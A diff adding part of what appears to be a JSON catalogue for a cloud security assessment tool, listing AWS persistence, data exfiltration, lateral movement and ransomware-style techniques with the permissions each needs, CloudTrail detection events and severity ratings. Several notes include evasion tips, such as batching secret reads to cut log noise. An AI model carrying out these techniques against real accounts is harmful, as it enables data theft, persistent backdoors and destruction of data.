+        "notes": "Grants an attacker-controlled account full control via S3 bucket ACLs. ACLs are often overlooked when auditing bucket policies. Persists until explicitly removed."
+      },
+      {
+        "id": "persist-storage-kms-key-policy",
+        "name": "KMS key policy backdoor",
+        "required_permissions": ["kms:PutKeyPolicy"],
+        "what_attacker_achieves": "External account gets permanent decrypt access to all data using that key",
+        "detection_events": ["PutKeyPolicy"],
+        "severity_default": "critical",
+        "notes": "Modifies the KMS key policy to grant the attacker's account kms:Decrypt and kms:GenerateDataKey. All data encrypted with that key is permanently accessible to the attacker."
+      },
+      {
+        "id": "persist-storage-kms-eternal-grant",
+        "name": "KMS eternal grant",
+        "required_permissions": ["kms:CreateGrant"],
+        "what_attacker_achieves": "Self-renewing grants — attacker can re-create grants even if some are revoked",
+        "detection_events": ["CreateGrant"],
+        "severity_default": "critical",
+        "notes": "Creates a KMS grant with CreateGrant permission in the grant constraints. Even if defenders revoke the grant, the attacker can recreate it. Grants bypass IAM policy and persist independently."
+      },
+      {
+        "id": "persist-storage-secretsmanager-resource-policy",
+        "name": "Secrets Manager resource policy",
+        "required_permissions": ["secretsmanager:PutResourcePolicy"],
+        "what_attacker_achieves": "External account reads secrets indefinitely",
+        "detection_events": ["PutResourcePolicy"],
+        "severity_default": "critical",
+        "notes": "Attaches a resource policy to a Secrets Manager secret granting the attacker's account GetSecretValue. Survives secret rotation — the policy persists on the secret regardless of value changes."
+      },
+      {
+        "id": "persist-storage-malicious-rotation-lambda",
+        "name": "Malicious rotation Lambda",
+        "required_permissions": ["secretsmanager:RotateSecret", "iam:PassRole"],
+        "what_attacker_achieves": "Every scheduled rotation exfiltrates current secret values",
+        "detection_events": ["RotateSecret"],
+        "severity_default": "critical",
+        "notes": "Points the secret's rotation Lambda to an attacker-controlled function. Every subsequent rotation event calls the malicious function, which exfiltrates the new secret value before completing rotation."
+      },
+      {
+        "id": "persist-storage-version-stage-hijacking",
+        "name": "Version stage hijacking",
+        "required_permissions": ["secretsmanager:PutSecretValue", "secretsmanager:UpdateSecretVersionStage"],
+        "what_attacker_achieves": "Hidden secret version; attacker atomically flips AWSCURRENT on demand",
+        "detection_events": ["PutSecretValue", "UpdateSecretVersionStage"],
+        "severity_default": "high",
+        "notes": "Creates a hidden secret version with a known value. The attacker can atomically promote it to AWSCURRENT at a chosen moment, poisoning all systems that read the secret."
+      },
+      {
+        "id": "persist-storage-cross-region-replica",
+        "name": "Cross-region replica promotion",
+        "required_permissions": ["secretsmanager:ReplicateSecretToRegions", "secretsmanager:StopReplicationToReplica"],
+        "what_attacker_achieves": "Standalone replica under attacker KMS key in untrusted region",
+        "detection_events": ["ReplicateSecretToRegions", "StopReplicationToReplica"],
+        "severity_default": "high",
+        "notes": "Replicates the secret to a region encrypted with an attacker-controlled KMS key, then stops replication to make the replica standalone. The replica retains the current secret value and is independently accessible."
+      }
+    ]
+  },
+  "post_exploitation": {
+    "data_exfiltration": [
+      {
+        "id": "postex-s3-data-theft",
+        "name": "S3 data theft",
+        "required_permissions": ["s3:GetObject", "s3:ListBucket"],
+        "impact": "Read sensitive data: Terraform state, backups, database dumps, configs",
+        "detection_events": ["GetObject", "ListBuckets"],
+        "severity_default": "high",
+        "notes": "High-value targets: buckets with names matching *prod*, *backup*, *config*, *terraform*, *state*."
+      },
+      {
+        "id": "postex-ebs-snapshot-dump",
+        "name": "EBS snapshot dump",
+        "required_permissions": ["ec2:CreateSnapshot", "ec2:ModifySnapshotAttribute"],
+        "impact": "Share disk snapshots to attacker account for offline analysis",
+        "detection_events": ["CreateSnapshot", "ModifySnapshotAttribute"],
+        "severity_default": "critical",
+        "notes": "Share EBS snapshots to an attacker-controlled account. Full disk image of production volumes accessible offline. Check for snapshots of database volumes and root volumes."
+      },
+      {
+        "id": "postex-ami-sharing",
+        "name": "AMI sharing",
+        "required_permissions": ["ec2:CreateImage", "ec2:ModifyImageAttribute"],
+        "impact": "Full disk image of running instance shared externally",
+        "detection_events": ["CreateImage", "ModifyImageAttribute"],
+        "severity_default": "critical",
+        "notes": "Creates an AMI from a running instance and shares it to an attacker account. Includes all data on attached volumes at time of snapshot. More complete than snapshot dump (captures all volumes)."
+      },
+      {
+        "id": "postex-secrets-batch-exfil",
+        "name": "Secrets Manager batch exfil",
+        "required_permissions": ["secretsmanager:BatchGetSecretValue", "secretsmanager:GetSecretValue"],
+        "impact": "Mass retrieval of secrets (up to 20/call)",
+        "detection_events": ["BatchGetSecretValue", "GetSecretValue"],
+        "severity_default": "critical",
+        "notes": "BatchGetSecretValue retrieves up to 20 secrets in a single API call, reducing CloudTrail noise vs individual GetSecretValue calls. Prioritize secrets with names matching *prod*, *db*, *rds*, *api*."
+      },
+      {
+        "id": "postex-kms-decrypt",
+        "name": "KMS decrypt data",
+        "required_permissions": ["kms:Decrypt"],
+        "impact": "Decrypt any data encrypted with accessible KMS keys",
+        "detection_events": ["Decrypt"],
+        "severity_default": "high",
+        "notes": "kms:Decrypt combined with S3/EBS/Secrets access unlocks encrypted data at rest. Check which keys are accessible and what services use them."
+      },
+      {
+        "id": "postex-lambda-credential-theft",
+        "name": "Lambda credential theft",
+        "required_permissions": ["lambda:InvokeFunction"],
+        "impact": "Steal execution role credentials from /proc/self/environ",
+        "detection_events": ["Invoke20150331v2"],
+        "severity_default": "high",
+        "notes": "Invoke an existing Lambda with a payload that returns environment variables or AWS_* credentials from /proc/self/environ. Credentials are temporary STS tokens but may have high privilege."
+      },
+      {
+        "id": "postex-vpc-traffic-mirror",
+        "name": "VPC traffic mirror",
+        "required_permissions": ["ec2:CreateTrafficMirrorSession", "ec2:CreateTrafficMirrorTarget", "ec2:CreateTrafficMirrorFilter"],
+        "impact": "Passive capture of all network traffic from target instances",
+        "detection_events": ["CreateTrafficMirrorSession", "CreateTrafficMirrorTarget", "CreateTrafficMirrorFilter"],
+        "severity_default": "critical",
+        "notes": "Creates a traffic mirroring session that copies all ENI traffic to an attacker-controlled target. Captures unencrypted traffic including API calls, database queries, and application data."
+      },
+      {
+        "id": "postex-glacier-restoration",
+        "name": "Glacier restoration",
+        "required_permissions": ["s3:RestoreObject", "s3:GetObject"],
+        "impact": "Restore and exfiltrate archived data assumed inaccessible",
+        "detection_events": ["RestoreObject", "GetObject"],
+        "severity_default": "high",
+        "notes": "Restores Glacier/S3 Glacier Deep Archive objects and exfiltrates them. Defenders often assume archived data is inaccessible. Restoration is asynchronous — plan for 12-48 hour delay."
+      },
+      {
+        "id": "postex-ebs-multiattach-live-read",
+        "name": "EBS Multi-Attach live read",
+        "required_permissions": ["ec2:AttachVolume"],
+        "impact": "Read live production data without creating snapshots",
+        "detection_events": ["AttachVolume"],
+        "severity_default": "critical",
+        "notes": "io1/io2 volumes support Multi-Attach — can be attached to an attacker-controlled instance while still attached to production. Reads live data without the snapshot creation events that typically trigger alerts."
+      },
+      {
+        "id": "postex-codebuild-env-var-secret-exfil",
+        "name": "CodeBuild environment variable secret exfiltration",
+        "required_permissions": ["codebuild:BatchGetProjects"],
+        "impact": "Plaintext credential retrieval: database passwords, API keys, OAuth tokens stored in CodeBuild project environment variables",
+        "detection_events": ["BatchGetProjects"],
+        "severity_default": "high",
+        "notes": "CodeBuild projects sometimes store secrets directly in environment variable definitions visible via BatchGetProjects — returned in plaintext in the API response. Check codebuild.json for env_secrets_exposure: true or environment variable names matching secret patterns (PASSWORD, SECRET, KEY, TOKEN, DB_, ACCESS_KEY, PRIVATE). Flag existence — do NOT read values in SCOPE output. This is a read-only reconnaissance technique; actual exploitation requires using the retrieved credentials against their target service."
+      },
+      {
+        "id": "postex-s3-access-point-delegation",
+        "name": "S3 Access Points cross-account delegation bypass",
+        "required_permissions": ["s3:CreateAccessPoint", "s3:PutBucketPolicy"],
+        "impact": "Cross-account data access to S3 bucket contents bypassing the bucket's main access policy",
+        "detection_events": ["CreateAccessPoint", "PutBucketPolicy", "GetObject"],
+        "severity_default": "high",
+        "notes": "S3 Access Points allow creating separate access policies per application. An attacker with s3:PutBucketPolicy on a sensitive bucket can add a statement delegating s3:CreateAccessPoint to an attacker-controlled account. The attacker then creates an access point in their own account for the target bucket, gaining read access to all objects under the access point's scope — bypassing any IP conditions or principal conditions in the main bucket policy. Check s3.json bucket policies for statements that include s3:CreateAccessPoint or s3:* with cross-account principals. Unlike direct bucket policy changes, the access point delegation creates a persistent exfiltration channel that survives cleanup of the original policy statement if the access point is not deleted."
+      }
+    ],
+    "lateral_movement": [
+      {
+        "id": "postex-cross-account-role-assumption",
+        "name": "Cross-account role assumption",
+        "required_permissions": ["sts:AssumeRole"],
+        "impact": "Pivot into other AWS accounts via trust relationships",
+        "detection_events": ["AssumeRole"],
+        "severity_default": "critical",
+        "notes": "Enumerate cross-account trust relationships from iam.json. Roles with Principal:* or wildcards are high-value pivots. Check config/accounts.json to distinguish internal vs external trusts."
+      },
+      {
+        "id": "postex-ssm-session-port-forward",
+        "name": "SSM session + port forwarding",
+        "required_permissions": ["ssm:StartSession"],
+        "impact": "Pivot through EC2 instances behind restrictive SGs/NACLs",
+        "detection_events": ["StartSession"],
+        "severity_default": "high",
+        "notes": "SSM Session Manager bypasses security groups entirely — traffic goes through the SSM endpoint. Port forwarding allows tunneling to RDS, Elasticache, or internal services unreachable from outside."
+      },
+      {
+        "id": "postex-lambda-event-source-hijack",
+        "name": "Lambda event source hijack",
+        "required_permissions": ["lambda:UpdateEventSourceMapping"],
+        "impact": "Redirect DynamoDB/Kinesis/SQS data streams to attacker function",
+        "detection_events": ["UpdateEventSourceMapping20150331v2"],
+        "severity_default": "high",
+        "notes": "Modifies an existing event source mapping to point a DynamoDB stream, Kinesis stream, or SQS queue at an attacker-controlled Lambda. All records processed by the legitimate function are also seen by the attacker."
+      },
+      {
+        "id": "postex-ec2-instance-connect-endpoint",
+        "name": "EC2 instance connect endpoint",
+        "required_permissions": ["ec2:CreateInstanceConnectEndpoint"],
+        "impact": "SSH access to private instances with no public IP",
+        "detection_events": ["CreateInstanceConnectEndpoint"],
+        "severity_default": "high",
+        "notes": "Creates an Instance Connect Endpoint that enables SSH to private instances in a VPC without a bastion host or public IP. The endpoint is created in the VPC and tunnels through AWS."
+      },
+      {
+        "id": "postex-ecs-agent-impersonation",
+        "name": "ECS agent impersonation (ECScape)",
+        "required_permissions": ["ecs:DiscoverPollEndpoint"],
+        "impact": "Steal all task role credentials on the host",
+        "detection_events": ["DiscoverPollEndpoint"],
+        "severity_default": "critical",
+        "notes": "From IMDS access on an ECS-managed EC2 host, an attacker can impersonate the ECS agent to steal credentials for all tasks running on that host. ECScape technique — access IMDS to get container credentials then call DiscoverPollEndpoint."
+      },
+      {
+        "id": "postex-s3-code-injection",
+        "name": "S3 code injection",
+        "required_permissions": ["s3:PutObject"],
+        "impact": "Modify S3-hosted code (Airflow DAGs, JS, CloudFormation) to pivot",
+        "detection_events": ["PutObject"],
+        "severity_default": "critical",
+        "notes": "Overwrite S3-hosted code files: Airflow DAG definitions, JavaScript bundles, CloudFormation templates, or configuration files loaded at runtime. Code executes with the consuming service's permissions."
+      },
+      {
+        "id": "postex-eni-private-ip-hijack",
+        "name": "ENI private IP hijack",
+        "required_permissions": ["ec2:AssignPrivateIpAddresses"],
+        "impact": "Impersonate trusted internal hosts; bypass IP-based ACLs",
+        "detection_events": ["AssignPrivateIpAddresses"],
+        "severity_default": "high",
+        "notes": "Assigns a secondary private IP from another host to an attacker-controlled instance. Allows bypassing IP-based NACLs and security group rules that trust specific private IPs."
+      },
+      {
+        "id": "postex-elastic-ip-hijack",
+        "name": "Elastic IP hijack",
+        "required_permissions": ["ec2:DisassociateAddress", "ec2:AssociateAddress"],
+        "impact": "Intercept inbound traffic; appear as trusted IP",
+        "detection_events": ["DisassociateAddress", "AssociateAddress"],
+        "severity_default": "high",
+        "notes": "Disassociates an Elastic IP from a legitimate instance and reassociates it to an attacker-controlled instance. All inbound traffic to that EIP is now directed to the attacker."
+      },
+      {
+        "id": "postex-sg-prefix-list-expansion",
+        "name": "Security group via prefix lists",
+        "required_permissions": ["ec2:ModifyManagedPrefixList"],
+        "impact": "Silently expand network access across all referencing SGs",
+        "detection_events": ["ModifyManagedPrefixList"],
+        "severity_default": "high",
+        "notes": "Adds attacker-controlled IP ranges to a managed prefix list. Any security group referencing that prefix list automatically allows the attacker's IPs. A single API call can expand access across hundreds of SGs."
+      },
+      {
+        "id": "postex-lambda-vpc-egress-bypass",
+        "name": "Lambda VPC egress bypass",
+        "required_permissions": ["lambda:UpdateFunctionConfiguration"],
+        "impact": "Remove Lambda from restricted VPC; restore internet access",
+        "detection_events": ["UpdateFunctionConfiguration"],
+        "severity_default": "high",
+        "notes": "Removes a Lambda function's VPC configuration, giving it unrestricted internet access. Useful when the function has a high-privilege execution role but is isolated in a private VPC with no NAT gateway."
+      },
+      {
+        "id": "postex-codepipeline-artifact-override",
+        "name": "CodePipeline artifact bucket poisoning — Deploy attacker code via pipeline service role",
+        "required_permissions": ["s3:PutObject"],
+        "impact": "Code execution in deployment targets with CodePipeline service role permissions (often cross-account, often production)",
+        "detection_events": ["PutObject", "StartPipelineExecution", "PutActionRevision"],
+        "severity_default": "critical",
+        "notes": "If codebuild.json shows a project with pipeline_source pointing to an S3 bucket, and the caller has s3:PutObject on that bucket, replacing the artifact triggers the pipeline — executing attacker-controlled code with the pipeline service role. This role typically has broad deployment permissions including cross-account assume role to production. Sub-technique: codepipeline:PutActionRevision injects a different source revision into a running pipeline without stopping it, potentially bypassing approval gates on specific revisions. Impact radius depends on how many AWS accounts the pipeline deploys to."
+      }
+    ],
+    "destructive_actions": [
+      {
+        "id": "postex-kms-ransomware-policy-swap",
+        "name": "KMS ransomware (policy swap)",
+        "required_permissions": ["kms:PutKeyPolicy"],
+        "impact": "Lock victim out of all data encrypted with the key",
+        "detection_events": ["PutKeyPolicy"],
+        "severity_default": "critical",
+        "notes": "Replaces the KMS key policy to remove all victim account access. All data encrypted with the key becomes permanently inaccessible unless key policy is restored within the deletion window."
+      },
+      {
+        "id": "postex-kms-ransomware-reencrypt",
+        "name": "KMS ransomware (re-encryption)",
+        "required_permissions": ["kms:ReEncrypt", "kms:ScheduleKeyDeletion"],
+        "impact": "Re-encrypt with attacker key, delete original",
+        "detection_events": ["ReEncrypt", "ScheduleKeyDeletion"],
+        "severity_default": "critical",
+        "notes": "Re-encrypts all data with an attacker-controlled KMS key, then schedules deletion of the original key. Data is inaccessible without the attacker's key after the 7-30 day deletion window."
+      },
+      {
+        "id": "postex-s3-ransomware-ssec",
+        "name": "S3 ransomware (SSE-C)",
+        "required_permissions": ["s3:PutObject"],
+        "impact": "Rewrite objects with attacker-held encryption key",
+        "detection_events": ["PutObject"],
+        "severity_default": "critical",
+        "notes": "Re-uploads S3 objects with SSE-C using an attacker-only encryption key. Original objects are overwritten. Without versioning enabled, originals are permanently lost. SSE-C keys are not stored by AWS."
+      },
+      {
+        "id": "postex-ebs-ransomware",
+        "name": "EBS ransomware",
+        "required_permissions": ["ec2:CreateSnapshot", "kms:ReEncrypt", "ec2:DeleteVolume"],
+        "impact": "Encrypt all volumes with attacker key, delete originals",
+        "detection_events": ["CreateSnapshot", "ReEncrypt", "DeleteVolume"],
+        "severity_default": "critical",
+        "notes": "Snapshot all EBS volumes, re-encrypt snapshots with attacker KMS key, restore to new volumes, then delete originals. Production data is fully inaccessible without attacker cooperation."
+      },
+      {
+        "id": "postex-secret-value-poisoning",
+        "name": "Secret value poisoning",
+        "required_permissions": ["secretsmanager:PutSecretValue"],
+        "impact": "DoS all systems depending on that secret",
+        "detection_events": ["PutSecretValue"],
+        "severity_default": "high",
+        "notes": "Overwrites a secret's value with invalid data (wrong password, invalid API key). Every service that reads the secret will fail to authenticate. Cascading failures across all consumers of the secret."
+      },
+      {
+        "id": "postex-kms-key-deletion",
+        "name": "KMS key deletion",
+        "required_permissions": ["kms:ScheduleKeyDeletion"],
+        "impact": "Permanent data loss after 7-day window",
+        "detection_events": ["ScheduleKeyDeletion"],
+        "severity_default": "critical",
+        "notes": "Schedules KMS key deletion (minimum 7 days). After deletion, all data encrypted with the key is permanently unrecoverable. AWS does not retain key material after deletion."
+      },
+      {
+        "id": "postex-iam-identity-deletion",
+        "name": "IAM identity deletion",
+        "required_permissions": ["iam:DeleteUser", "iam:DeleteRole"],
+        "impact": "Destroy identities and audit trails",
+        "detection_events": ["DeleteUser", "DeleteRole"],
+        "severity_default": "high",
+        "notes": "Deletes IAM users and roles to disrupt operations and destroy audit trails. Deleting the break-glass admin role creates a lockout scenario. Role deletion is not immediately reversible."
+      },
+      {
+        "id": "postex-flow-log-deletion",
+        "name": "Flow log deletion",
+        "required_permissions": ["ec2:DeleteFlowLogs"],
+        "impact": "Blind defenders to network activity",
+        "detection_events": ["DeleteFlowLogs"],
+        "severity_default": "high",
+        "notes": "Deletes VPC flow logs to remove network visibility. Defenders lose the ability to trace lateral movement, data exfiltration paths, or C2 communication after the logs are deleted."
+      },
+      {
+        "id": "postex-federation-provider-deletion",
+        "name": "Federation provider deletion",
+        "required_permissions": ["iam:DeleteSAMLProvider", "iam:DeleteOpenIDConnectProvider"],
+        "impact": "Break all SSO/federated access",
+        "detection_events": ["DeleteSAMLProvider", "DeleteOpenIDConnectProvider"],
+        "severity_default": "critical",
+        "notes": "Deletes SAML or OIDC identity providers used for SSO. All users authenticating via that provider immediately lose access. In orgs that rely entirely on federated access, this is a full lockout."
+      }
+    ]
+  }
+}
